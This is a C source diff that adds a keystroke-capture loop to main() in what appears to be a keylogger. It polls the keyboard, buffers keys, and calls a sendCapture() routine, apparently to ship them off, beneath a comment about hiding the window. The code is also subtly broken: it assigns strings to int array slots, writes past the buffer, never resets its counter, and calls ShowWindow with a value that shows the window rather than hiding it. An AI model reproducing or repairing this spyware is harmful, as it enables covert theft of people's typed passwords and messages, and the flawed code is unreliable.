@@ -61,7 +61,32 @@ int sendCapture(void) {
 }
 
 int main(void) {
-	sendCapture();
+	int capture[N], key, l = 0;
+
+	// Hide window
+	HWND window;
+	AllocConsole();
+	window = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(window, 1);
+
+	while (1) {
+		Sleep(20);
+		if (kbhit()) {
+			key = getch();
+
+			if (l + 1 == N) {
+				capture[l + 1] = "\0";
+				sendCapture();
+
+				capture[0] = "\0";
+			}
+
+			if (l < N) {
+				capture[l] = key;
+				l++;
+			}
+		}
+	}
 
 	return 1;
 }
